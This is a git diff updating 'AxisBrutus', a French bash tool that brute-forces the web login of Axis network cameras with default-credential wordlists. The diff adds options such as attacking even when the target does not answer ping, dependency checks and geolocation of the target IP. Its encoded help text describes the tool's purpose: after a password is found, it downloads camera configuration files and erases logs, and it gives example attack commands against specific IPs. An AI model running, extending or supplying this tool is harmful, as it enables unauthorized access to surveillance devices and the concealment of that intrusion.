@@ -10,7 +10,7 @@ ab_auteur='CHORFA Alla-eddine'
 ab_date_creation='25.07.2019'
 ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
 ab_titre='AxisBrutus'
-ab_ver='2.3'
+ab_ver='2.4'
 ab_contact='h4ckr213dz@gmail.com'
 ab_web='https://github.com/dino213dz/'
 ab_slogan='La plus fine des brutes!'
@@ -69,11 +69,11 @@ banniere_tryagain='IF9fX19fXyAgIF9fX19fXyAgICAgX18gIF9fICAgICAgICBfX19fX18gICAgI
 banniere_aide=$banniere_export
 
 taille_barre_progression=40
-barre_car_fait=":"
-barre_car_restant=":"
-barre_col_fait="\033[0m\033[1;46;33m"
-barre_col_restant="\033[0m\033[0;44;30m"
-barre_col_texte="\033[0m\033[1;33m"
+barre_car_fait="■"
+barre_car_restant="■"
+barre_col_fait="\033[0m\033[1;42;32m"
+barre_col_restant="\033[0m\033[0;44;36m"
+barre_col_texte="\033[1;33m"
 
 #Inti. var. travail
 curl_timeout_default=5
@@ -100,10 +100,11 @@ modeles_verifie=''
 urlforced=''
 exportforced=''
 args=("$@")
+#args=(${args[@]} "fin" ) # ajotuer un dernier argument
 nb_args=$#
 
 #liste des modeles testés
-liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")
+liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "243SA" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")
 
 ####################################################################################################################
 #                                                       FONCTIONS
@@ -115,11 +116,16 @@ liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" 
 # detecte si erreur 401 : page non autorisée
 function checkConnectiviteCible {
 	#ping_timeout=10
-	packets_perdus=$(/bin/ping -W $ping_timeout -c 1 $ip_only|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
-	if [ $packets_perdus -ne 0 ];then
-		echo "ECHEC"
+	packets_perdus=$(/bin/ping -W $ping_timeout -c 1 $ip_only 2>/dev/null|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
+	packets_perdus=$(echo $packets_perdus|egrep "[0-9]*")
+	if [ "$packets_perdus" != "" ];then
+		if [ $packets_perdus -ne 0 ];then
+			echo "ECHEC"
+		else
+			echo "SUCCES"
+		fi
 	else
-		echo "SUCCES"
+		echo "ECHEC"
 	fi
 	}
 
@@ -257,7 +263,7 @@ function infosGeolocalisation {
 
 	#retirer les infos inutiles
 	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
-	infosDbIpDotCom=${infosDbIpDotCom/'continentCode'*'countryName:'/'Pays:'}
+	#infosDbIpDotCom=${infosDbIpDotCom/continentCode*countryName:/'Pays:'}
 	
 
 	#Mise en forme pour le script
@@ -266,6 +272,11 @@ function infosGeolocalisation {
 	infosDbIpDotCom=${infosDbIpDotCom//'"'/''}	
 	
 	#Traduction
+	infosDbIpDotCom=${infosDbIpDotCom/'continentCode:'/'Code continent:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'continentName:'/'Continent:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'countryCode:'/'Code pays:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'countryName:'/'Pays:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'stateProvCode:'/'Code état:'}
 	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/'Département/Etat:'}
 	infosDbIpDotCom=${infosDbIpDotCom/'city:'/'Ville/Commune:'}
 
@@ -373,7 +384,7 @@ function ajouterEspacesSlogans {
 #FUNCTION:
 # verifie l'existence des fichiers
 function afficherAide {
-	aide_texte="IyBBWElTIEJSVVRVUyAKCiMgQSBwcm9wb3M6CiAtIEF1dGV1cjogQ0hPUkZBIEFsbGEtZWRkaW5lCiAtIENyw6llIGxlOiAyNS4wNy4yMDE5CiAtIEVkaXTDqSBsZTogMDIuMDguMjAxOQogLSBWZXJzaW9uOiAyLjMKIC0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KIC0gV2ViOiBodHRwOi8vZGlubzIxM2R6LmZyZWUuZnIKCiMgRGVzY3JpcHRpb246CiAtIExhIHBsdXMgZmluZSBkZXMgYnJ1dGVzIQogLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwogLSBOZWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc191c2Vycy50eHQKCTItIC4vd29yZGxpc3RzL2F4aXNfbWRwLnR4dAogLSBDZXMgZmljaGllcnMgY29udGllbm5ldCBsZXMgbG9naW5zIGV0IG1vdC1kZS1wYXNzZSBwYXIgZGVmYXV0IGRlcyBjYW1lcmFzIEF4aXMuCgojIEFsZ29yaXRobWU6CiAtIFLDqWN1cGVyZXIgbGUgbW9kZWxlIGRlIGxhIGNhbWVyYQogLSBSZWN1cGVyZXIgbGUgZmlybXdhcmUgCiAtIFJlY2hlcmNoZSBkJ1VSTCBwcm90ZWfDqWUgcGFyIG1vdC1kZS1wYXNzZSAKIC0gQnJ1dGVmb3JjZQogLSBTaSBtb3QgZGUgcGFzc2UgdHJvdXbDqToKIC0gVGVsZWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KIC0gU2F1dmVnYXJkZSBkZXMgZG9ubsOpZXMKIC0gRWZmYWNlciBsZXMgbG9ncwoKIyBTeW50YXhlOgogLSAkPiAuL2F4aXNCcnV0dXMuc2ggLWMgSVA6UE9SVCBbT1BUSU9OU10gCgojIFBhcmFtZXRyZXMgb2JsaWdhdG9pcmVzOgogLSAtLWNpYmxlLCAtYyA6IElQLCBJUDpQT1JULCBVUkwKCiMgUGFyYW1ldHJlcyBvcHRpb25uZWxzOgogLSAtLXNraXAsIC1zIDogTidlZmZlY3R1ZSBwYXMgbGEgZGV0ZWN0aW9uIGR1IG1vZGVsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCBldHJlIHV0aWxpc8OpIHBvdXIgY2hhbmdlciBsJ3VybCBjaWJsZS4KIC0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2RlbGVzIGRlIGNhbWVyYSBjb21wYXRpYmxlcwogLSAtLWhlbHAsIC1oIDogYWZmaWNoZSBsJ2FpZGUKIC0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKIC0gLS1jaGVjaywgLS1jaGsgOiBWw6lyaWZpZSB1bmlxdWVtZW50IGxhIGNvbXBhdGliaWxpdMOpIGQndW4gbW9kZWxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQogLSAtLWxvZywgLS1sb2dzIDogRMOpZmluaXQgbCdlbXBsYWNlbWVudCBkdSBmaWNoaWVyIGxvZ3MgZGVzIG9wZXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgIHBhciBkw6lmYXV0IGVzdCA6IC4vYXhpc0JydXR1cy5sb2cKIC0gLS1wYXNzd29yZHMsIC1wIDogZmljaGllciB3b3JkbGlzdCBjb250ZW5hbnQgbGEgbGlzdGUgZGVzIG1vdHMtZGUtcGFzc2UKIC0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwogLSAtLWV4cG9ydCwgLS1vdXRwdXQsIC1vIDogZmljaGllciBkYW5zIGxlcXVlbCBsZSBtb3QtZGUtcGFzc2Ugc2VyYSBlbnJlZ2lzdHLDqSBzJ2lsIGVzdCB0cm91dsOpLiBBdWN1biBmaWNoaWVyIGNyw6nDqSBzaSBsZSBtb3QtZGUtcGFzc2Ugbidlc3QgcGFzIHRyb3V2w6kKIC0gLS11cmwsIC1yIDogTCd1cmwgZMOpcGVuZCBkdSBtb2RlbGUuIFZvdXMgcG91dmV6IGxlIG1vZGlmaWVyIHNpIHZvdXMgc291aGFpdGV6IHRlc3RlciB1bmUgcGFnZSB3ZWIgYmllbiBwcsOpY2lzZSAoY2FzIGQndW4gbW9kZWxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCiAtIC0tdmVyYm9zZSwgLXYgOiBwZXJtZXQgZCdhZmZpY2hlciBwbHVzIG91IG1vaW5zIGQnaW5mb3Mgw6AgbCfDqWNyYW4uIFNpIHZlcmJldXggYWxvcnMgOiBHYXJkZSDDoCBsJ2VjcmFuIGxlcyBjb21iaW5haXNvbnMgdGVzdMOpZXMgJiBhZmZpY2hlIGxlIGNvbnRlbnUgZHUgZmljaGVycyB0w6lsw6ljaGFyZ8OpcwogLSAtLXRpbWVvdXQsIC10IDogZGVmaW5pdCBsZSB0ZW1wcyBkZSByZXBvbnNlIGxpbWl0ZSBkYW5zIGN1cmwKIC0gLS1tYXh0aW1lLCAtbSA6IETDqWZpbml0IGxlIHRlbXBzIGxpbWl0ZSBkJ3VuZSByZXF1ZXRlIGN1cmwKIC0gLS1waW5nLXRpbWVvdXQgOiBkZWZpbml0IGxlIHRpbWVvdXQgZHUgdGVzdCBkZSBjb25lbmN0aXZpdMOpIChwaW5nKQoKIyBFeGVtcGxlczoKIC0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkZWZhdXQuIChWb2lyICJEZXNjcmlwdGlvbiIpCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIAoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKIC0gQWZmaWNoZXIgbGEgbGlzdGUgZGVzIG1vZMOobGVzIGNvbXBhdGlibGVzCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbGlzdAoKIC0gUGFzIGRlIGdlb2xvY2FsaXNhdGlvbgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLW5vLWdlbwoKIC0gUGFzIGRlIGRldGVjdGlvbiBkdSBtb2RlbGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCiAtIERlZmluaXIgdW5lIGxpc3RlIGRlIGxvZ2luIG1vdC1kZS1wYXNzZSAKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1wYXNzd29yZHMgLi9heGlzX3Bhc3MudHh0IC0tdXNlcm5hbWVzIC4vYXhpc191c2VybmFtZXMudHh0IAoKIC0gRGVmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZSAKCiAtIEZpY2hpZXIgbG9ncyBkJ2F0dGFxdWU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbG9nIC4vdGVzdC5sb2cgCgogLSBNb2RlIHZlcmJldXggOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXZlcmJvc2UgCgogLSBQYXJhbWV0cmFnZSBjdXJsOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLW1heHRpbWUgMTAgLS10aW1lb3V0IDQgCgoK"
+	aide_texte="IyBBWElTIEJSVVRVUwoKIyBBIHByb3BvczoKLSBBdXRldXI6IENIT1JGQSBBbGxhLWVkZGluZQotIENyw6llIGxlOiAyNS4wNy4yMDE5Ci0gRWRpdMOpIGxlOiAwMi4wOC4yMDE5Ci0gVmVyc2lvbjogMi40Ci0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KLSBXZWI6IGh0dHA6Ly9kaW5vMjEzZHouZnJlZS5mcgoKIyBEZXNjcmlwdGlvbjoKLSBMYSBwbHVzIGZpbmUgZGVzIGJydXRlcyEKLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwotIE7DqWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc191c2Vycy50eHQKCTItIC4vd29yZGxpc3RzL2F4aXNfbWRwLnR4dAotIENlcyBmaWNoaWVycyBjb250aWVubmVudCBsZXMgbG9naW5zIGV0IG1vdC1kZS1wYXNzZSBwYXIgZMOpZmF1dCBkZXMgY2Ftw6lyYXMgQXhpcy4KCiMgQWxnb3JpdGhtZToKLSBWw6lyaWZpZXIgbGVzIGTDqXBlbmRhbmNlcwotIFZlcmlmaWVyIGxlcyBwYXJhbcOodHJlcyBldCBsZXMgZmljaGllcnMKLSBWZWlmaWVyIGxhIGNvbm5lY3Rpdml0w6kgZGUgbGEgY2libGUKLSBSw6ljdXBlcmVyIGxlIG1vZMOobGUgZGUgbGEgY2Ftw6lyYQotIFJlY3VwZXJlciBsZSBmaXJtd2FyZQotIFJlY2hlcmNoZSBkJ1VSTCBwcm90w6lnw6llIHBhciBtb3QtZGUtcGFzc2UKLSBCcnV0ZSBmb3JjZQotIFNpIG1vdCBkZSBwYXNzZSB0cm91dsOpOgotIFTDqWzDqWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KLSBTYXV2ZWdhcmRlIGRlcyBkb25uw6llcwotIEVmZmFjZXIgbGVzIGxvZ3MKCiMgU3ludGF4ZToKLSAkPiAuL2F4aXNCcnV0dXMuc2ggLWMgSVA6UE9SVCBbT1BUSU9OU10KCiMgUGFyYW3DqHRyZXMgb2JsaWdhdG9pcmVzOgotIC0tY2libGUsIC1jIDogSVAsIElQOlBPUlQsIFVSTAoKIyBQYXJhbWV0cmVzIG9wdGlvbm5lbHM6Ci0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGTDqXRlY3Rpb24gZHUgbW9kw6hsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCDDqnRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCi0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2TDqGxlcyBkZSBjYW3DqXJhIGNvbXBhdGlibGVzCi0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCi0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKLSAtLWNoZWNrLCAtLWNoayA6IFbDqXJpZmllIHVuaXF1ZW1lbnQgbGEgY29tcGF0aWJpbGl0w6kgZCd1biBtb2TDqGxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQotIC0tbG9nLCAtLWxvZ3MgOiBEw6lmaW5pdCBsJ2VtcGxhY2VtZW50IGR1IGZpY2hpZXIgbG9ncyBkZXMgb3DDqXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgcGFyIGTDqWZhdXQgZXN0IDogLi9heGlzQnJ1dHVzLmxvZwotIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCi0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwotIC0tZXhwb3J0LCAtLW91dHB1dCwgLW8gOiBmaWNoaWVyIGRhbnMgbGVxdWVsIGxlIG1vdC1kZS1wYXNzZSBzZXJhIGVucmVnaXN0csOpIHMnaWwgZXN0IHRyb3V2w6kuIEF1Y3VuIGZpY2hpZXIgY3LDqcOpIHNpIGxlIG1vdC1kZS1wYXNzZSBuJ2VzdCBwYXMgdHJvdXbDqQotIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kw6hsZS4gVm91cyBwb3V2ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBiaWVuIHByw6ljaXNlIChjYXMgZCd1biBtb2TDqGxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCi0gLS12ZXJib3NlLCAtdiA6IHBlcm1ldCBkJ2FmZmljaGVyIHBsdXMgb3UgbW9pbnMgZCdpbmZvcyDDoCBsJ8OpY3Jhbi4gU2kgdmVyYmV1eCBhbG9ycyA6IEdhcmRlIMOgIGwnZWNyYW4gbGVzIGNvbWJpbmFpc29ucyB0ZXN0w6llcyAmIGFmZmljaGUgbGUgY29udGVudSBkZXMgZmljaGllcnMgdMOpbMOpY2hhcmfDqXMKLSAtLXRpbWVvdXQsIC10IDogZMOpZmluaXQgbGUgdGVtcHMgZGUgcsOpcG9uc2UgbGltaXRlIGRhbnMgY3VybAotIC0tbWF4dGltZSwgLW0gOiBkw6lmaW5pdCBsZSB0ZW1wcyBsaW1pdGUgZCd1bmUgcmVxdcOqdGUgY3VybAotIC0tcGluZy10aW1lb3V0IDogZMOpZmluaXQgbGUgdGltZW91dCBkdSB0ZXN0IGRlIGNvbm5lY3Rpdml0w6kgKHBpbmcpCi0gLS1pZ25vcmUsIC1pIDogaWdub3JlciBsZSByw6lzdWx0YXQgZHUgdGVzdCBkZSBjb25uZWN0aXZpdMOpIChhdHRhcXVlciBkYW5zIHRvdXMgbGVzIGNhcykKCiMgRXhlbXBsZXM6Ci0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkw6lmYXV0LiAoVm9pciAiRGVzY3JpcHRpb24iKQoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKLSBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1saXN0CgotIFBhcyBkZSBnw6lvbG9jYWxpc2F0aW9uCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbm8tZ2VvCgotIFBhcyBkZSBkw6l0ZWN0aW9uIGR1IG1vZMOobGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCi0gRGVmaW5pciB1bmUgbGlzdGUgZGUgbG9naW4gbW90LWRlLXBhc3NlCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tcGFzc3dvcmRzIC4vYXhpc19wYXNzLnR4dCAtLXVzZXJuYW1lcyAuL2F4aXNfdXNlcm5hbWVzLnR4dAoKLSBEw6lmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZQoKLSBGaWNoaWVyIGxvZ3MgZCdhdHRhcXVlOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLWxvZyAuL3Rlc3QubG9nCgotIE1vZGUgdmVyYmV1eCA6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tdmVyYm9zZQoKLSBQYXJhbcOpdHJhZ2UgY3VybDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1tYXh0aW1lIDEwIC0tdGltZW91dCA0CgotIFBhcmFtw6l0cmFnZSBwaW5nOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXBpbmctdGltZW91dCA0CgotIElnbm9yZXIgbGUgcsOpc3VsdGF0IGR1IHBpbmc6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0taWdub3JlCgo="
 	echo -e $banniere_aide$aide_texte|base64 -d
 	}
 
@@ -475,9 +486,29 @@ function afficherBarre {
 for no_arg in $(seq 0 $nb_args); do
 	valeur=${args[$no_arg]}
 	if [ ${#valeur} -gt 0 ];then
-		#parametre obligatoire
+
+		#parametre speciaux
+		#affichage aide 
+		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
+			echo -e "$ab_titre \t-\t Ver. $ab_ver du $ab_date_maj"
+			afficherAide
+			exit
+		fi
+		#lister les modeles testés
+		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
+			echo -e "# Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
+			for mod in ${liste_modeles_verifies[*]}; do
+				echo -e " - AXIS $mod Network Camera"
+			done
+			exit
+		fi
+		#sauter la verification du modele
+		if [ "$valeur" = "--skip" ] || [ "$valeur" = "-s" ];then
+			skipModeleDetect='OUI'
+		fi
 
 		#cible attaquée: ip, ip:port, url
+		#parametre obligatoire
 		if [ "$valeur" = "--cible" ] || [ "$valeur" = "-c" ];then
 			ip=${args[$(($no_arg+1))]}
 			ip=${ip/https:\/\//}
@@ -512,18 +543,9 @@ for no_arg in $(seq 0 $nb_args); do
 			exportforced='OUI'
 			fichier_mdp_trouve=${args[$(($no_arg+1))]}
 		fi
-		#sauter la verification du modele
-		if [ "$valeur" = "--skip" ] || [ "$valeur" = "-s" ];then
-			skipModeleDetect='OUI'
-		fi
 		#sauter la geolocalisation
 		if [ "$valeur" = "--no-geo" ] || [ "$valeur" = "--nogeo" ] || [ "$valeur" = "-g" ];then
 			skipGeo='OUI'
-		fi
-		#check
-		if [ "$valeur" = "--check" ] || [ "$valeur" = "-k" ] ;then
-			skipModeleDetect='NON'
-			checkOnly='OUI'
 		fi
 		#fichier logs
 		if [ "$valeur" = "--log" ] || [ "$valeur" = "--logs" ];then
@@ -533,16 +555,12 @@ for no_arg in $(seq 0 $nb_args); do
 		if [ "$valeur" = "--verbose" ] || [ "$valeur" = "-v" ] ;then
 			modeVerbose='OUI'
 		fi
+		#Ignorer le test de connectivité
+		if [ "$valeur" = "--ignore" ] || [ "$valeur" = "-i" ] ;then
+			noPing='OUI'
+		fi
 		#parametres optionnels informatifs/pas d'attaques/quitte apres avoir executé l'option
 
-		#lister les modeles testés
-		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
-			echo -e "# Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
-			for mod in ${liste_modeles_verifies[*]}; do
-				echo -e " - AXIS $mod Network Camera"
-			done
-			exit
-		fi
 		#configuration requetes http(curl) 
 		if [ "$valeur" = "--timout" ] || [ "$valeur" = "-t" ];then
 			curl_timeout=${args[$(($no_arg+1))]}
@@ -562,11 +580,11 @@ for no_arg in $(seq 0 $nb_args); do
 				ping_timeout=$min_timeout
 			fi
 		fi
-		#affichage aide 
-		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
-			echo -e "$ab_titre \t-\t Ver. $ab_ver du $ab_date_maj"
-			afficherAide
-			exit
+		#check
+		if [ "$valeur" = "--check" ] || [ "$valeur" = "-k" ]; then
+			skipModeleDetect='NON'
+			checkOnly='OUI'
+			skipGeo='OUI'
 		fi
 	fi
 done
@@ -607,12 +625,17 @@ nb_mdp=$(cat $mdp_wordlist|wc -l)
 nb_users=$(cat $users_wordlist|wc -l)
 nb_combinaisons=$(($nb_users*$nb_mdp))
 
+
 ####################################################################################################################
 #                                                        START
 ####################################################################################################################
 clear
 
-logMessage "#################### Démarrage : $nb_combinaisons combinaisons possibles ####################" "INFORMATION" 
+if [ "$checkOnly" != "OUI" ];then
+	logMessage "#################### Démarrage : $nb_combinaisons combinaisons possibles ####################" "INFORMATION" 
+else
+	logMessage "#################### Verifications uniquement : ####################" "INFORMATION" 
+fi
 
 #banniere
 echo -en $rouge_fonce
@@ -654,11 +677,39 @@ echo -en $cyan_fonce
 echo -e $espaces$texte_web
 
 
-#infos multicouleurs
-#echo -e "$vert_fonce $ab_auteur$cyan_fonce Ver. $ab_ver$bleu_fonce $ab_contact$magenta_fonce $ab_web$reset\n"
+####################################################################################################################
+#                                            VERFIFICATIONS DES DEPENDENCES
+####################################################################################################################
 
-#debug : exit
+echo -e "$jaune_fonce\n$souligne"'VERFIFICATIONS DES DEPENDENCES:'$reset
 
+
+echo -e "$jaune[+] Commandes : $cyan"
+#curl
+ping_existe=$(command -v ping)
+curl_existe=$(command -v curl)
+if [ ${#ping_existe} -gt 0 ];then
+	ping_existe="OUI"
+	echo -e "$jaune |_[-] Ping :$vert OK!"
+else
+	ping_existe="NON"
+	echo -e "$jaune |_[-] Ping :$rouge NON!"
+	echo -e "$jaune |  |_[-] Solution :$cyan apt install net-tools"
+fi
+if [ ${#curl_existe} -gt 0 ];then
+	curl_existe="OUI"
